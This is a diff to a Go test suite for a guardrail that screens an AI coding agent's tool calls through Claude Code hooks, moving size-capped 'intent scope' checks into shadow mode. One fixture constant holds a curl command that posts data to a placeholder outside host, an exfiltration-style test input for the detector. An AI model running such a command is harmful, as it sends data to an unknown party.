@@ -21,6 +21,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -169,12 +170,25 @@ func TestKeepDecisionStateEvictsOneAtATime(t *testing.T) {
 
 // ---- the bound rule's cross-lane property test (bounded_lanes_test.go) -------------------
 
+// The lane is shadow-only in 1.0.10: the floor records and the live verdict is
+// rel's, so it registers as a shadow lane of the bound rule
+// (bounded_shadow_lanes_test.go): the live verdict past a cap equals the verdict
+// with the lane off, in every tier, and the lane's record names the cap.
+// TestIntentScopeAlertModeKeepsTheUnknownTier holds what the lane gives on the day
+// it is promoted.
 func init() {
-	registerBoundedLane(
-		boundedLaneCap{lane: "intent scope destinations", cap: bounded.Items, limit: maxScopeDestinations, gen: intentScopeLane(intentScopeDestinationsCall), seen: intentScopeSeenCall, decide: intentScopeDecide},
-		boundedLaneCap{lane: "intent scope depth", cap: bounded.Depth, limit: maxScopeDepth, gen: intentScopeLane(intentScopeDepthCall), seen: intentScopeSeenCall, decide: intentScopeDecide},
-		boundedLaneCap{lane: "intent scope values", cap: bounded.Nodes, limit: maxScopeValues, gen: intentScopeLane(intentScopeValuesCall), seen: intentScopeSeenCall, decide: intentScopeDecide},
+	registerBoundedShadowLane(
+		boundedShadowLane{lane: "intent scope destinations", cap: bounded.Items, limit: maxScopeDestinations, gen: intentScopeLane(intentScopeDestinationsCall), seen: intentScopeSeenCall,
+			route: intentScopeShadowRoute, recordNamesCap: intentScopeRecordNamesCap},
+		boundedShadowLane{lane: "intent scope depth", cap: bounded.Depth, limit: maxScopeDepth, gen: intentScopeLane(intentScopeDepthCall), seen: intentScopeSeenCall,
+			route: intentScopeShadowRoute, recordNamesCap: intentScopeRecordNamesCap},
+		boundedShadowLane{lane: "intent scope values", cap: bounded.Nodes, limit: maxScopeValues, gen: intentScopeLane(intentScopeValuesCall), seen: intentScopeSeenCall,
+			route: intentScopeShadowRoute, recordNamesCap: intentScopeRecordNamesCap},
 	)
+}
+
+func intentScopeRecordNamesCap(record string, cap bounded.Cap) bool {
+	return strings.Contains(record, bounded.ReasonCode+" cap="+cap.String())
 }
 
 const intentScopeUnnamedSend = "curl -s -d x http://unnamed.example/in"
@@ -229,18 +243,26 @@ func intentScopeValuesCall(size int, seen bool) boundedLaneCall {
 
 var intentScopeJudged = map[*APIServer]bool{}
 
-// intentScopeDecide runs one call after a typed prompt through the Claude Code
-// hook with a tool judge that finds nothing, so the answer is the scope floor's.
-func intentScopeDecide(t *testing.T, api *APIServer, env boundedEnv, call boundedLaneCall) (string, []string) {
+// intentScopeCleanJudge gives the API a regex_judge tool judge whose answer is
+// always clean, so the answer of a call is the scope floor's, once per API.
+func intentScopeCleanJudge(t *testing.T, api *APIServer) {
 	t.Helper()
-	if !intentScopeJudged[api] {
-		intentScopeJudged[api] = true
-		api.scannerCfg.DataDir = t.TempDir()
-		api.scannerCfg.Guardrail.DetectionStrategy = "regex_judge"
-		api.scannerCfg.Guardrail.Judge = config.JudgeConfig{Enabled: true, ToolInjection: true, HookConnectors: []string{"claudecode"}, IntentScope: config.IntentScopeAlert}
-		clean := &mockLLMProvider{response: &ChatResponse{Model: "m", Choices: []ChatChoice{{Message: &ChatMessage{Content: `{"findings": []}`}}}, Usage: &ChatUsage{PromptTokens: 1, CompletionTokens: 1}}}
-		api.SetHookJudge(&LLMJudge{cfg: &api.scannerCfg.Guardrail.Judge, model: "test-model", provider: clean, rp: &guardrail.RulePack{}})
+	if intentScopeJudged[api] {
+		return
 	}
+	intentScopeJudged[api] = true
+	api.scannerCfg.DataDir = t.TempDir()
+	api.scannerCfg.Guardrail.DetectionStrategy = "regex_judge"
+	api.scannerCfg.Guardrail.Judge = config.JudgeConfig{Enabled: true, ToolInjection: true, HookConnectors: []string{"claudecode"}}
+	clean := &mockLLMProvider{response: &ChatResponse{Model: "m", Choices: []ChatChoice{{Message: &ChatMessage{Content: `{"findings": []}`}}}, Usage: &ChatUsage{PromptTokens: 1, CompletionTokens: 1}}}
+	api.SetHookJudge(&LLMJudge{cfg: &api.scannerCfg.Guardrail.Judge, model: "test-model", provider: clean, rp: &guardrail.RulePack{}})
+}
+
+// intentScopeRoute runs one call after a typed prompt through the Claude Code
+// PreToolUse hook with the lane in the given mode.
+func intentScopeRoute(t *testing.T, api *APIServer, env boundedEnv, call boundedLaneCall, mode string) (string, []string) {
+	t.Helper()
+	api.scannerCfg.Guardrail.Judge.IntentScope = mode
 	session := fmt.Sprintf("bnd-scope-%d", time.Now().UnixNano())
 	ctx := ContextWithSessionID(t.Context(), session)
 	api.evaluateClaudeCodeHook(ctx, claudeCodeHookRequest{HookEventName: "UserPromptSubmit", SessionID: session, CWD: env.cwd, Prompt: "summarize the project README"})
@@ -250,4 +272,66 @@ func intentScopeDecide(t *testing.T, api *APIServer, env boundedEnv, call bounde
 		findings = append(findings, strings.TrimPrefix(f, "llm-judge:"))
 	}
 	return resp.Action, findings
+}
+
+// intentScopeShadowRoute is the shadow lane's route: the live action and findings
+// and the records (the shadow reasons) the call wrote.
+func intentScopeShadowRoute(t *testing.T, api *APIServer, env boundedEnv, call boundedLaneCall, mode string) (string, []string, []string) {
+	t.Helper()
+	intentScopeCleanJudge(t, api)
+	var mu sync.Mutex
+	var records []string
+	obs := func(_, _, reason string) {
+		mu.Lock()
+		records = append(records, reason)
+		mu.Unlock()
+	}
+	scopeShadowObserver.Store(&obs)
+	defer scopeShadowObserver.Store(nil)
+	action, findings := intentScopeRoute(t, api, env, call, mode)
+	mu.Lock()
+	defer mu.Unlock()
+	return action, findings, append([]string(nil), records...)
+}
+
+// What the lane gives the day it is promoted (alert mode, set by tests and the
+// harness only): past a cap the call is at least the unknown tier of its pack and
+// names the cap, at the cap it is not truncated, and what was read before the cap
+// is still judged. The property test holds this for deciding lanes; this lane
+// ships in shadow, so the check lives here.
+func TestIntentScopeAlertModeKeepsTheUnknownTier(t *testing.T) {
+	env := boundedLaneEnv(t)
+	for _, tier := range boundedTestTiers {
+		api := boundedTierAPI(t, tier.posture, tier.managed, tier.tier)
+		intentScopeCleanJudge(t, api)
+		floor := bounded.Unknown(tier.tier)
+		for _, lane := range boundedShadowLanes {
+			if !strings.HasPrefix(lane.lane, "intent scope ") {
+				continue
+			}
+			name := tier.name + "/" + lane.lane
+			seenAction, _ := intentScopeRoute(t, api, env, lane.seen(), config.IntentScopeAlert)
+			seenAlone := boundedParse(seenAction)
+			at, _ := lane.gen(lane.limit, boundedShape{})
+			if _, findings := intentScopeRoute(t, api, env, at, config.IntentScopeAlert); boundedHasLimit(findings, lane.cap, false) {
+				t.Errorf("%s: the input at the cap is already truncated: %v", name, findings)
+			}
+			for _, s := range boundedShapes[:2] {
+				for _, size := range []int{lane.limit + 1, 2 * lane.limit} {
+					call, _ := lane.gen(size, s.shape)
+					action, findings := intentScopeRoute(t, api, env, call, config.IntentScopeAlert)
+					want := floor
+					if s.shape.seen {
+						want = bounded.Stricter(want, seenAlone)
+					}
+					if got := boundedParse(action); got < want {
+						t.Errorf("%s %s size=%d: action %s, want at least %s; findings=%v", name, s.name, size, got, want, findings)
+					}
+					if !boundedHasLimit(findings, lane.cap, true) {
+						t.Errorf("%s %s size=%d: no %s finding naming the cap: %v", name, s.name, size, evaluationLimitRuleID, findings)
+					}
+				}
+			}
+		}
+	}
 }
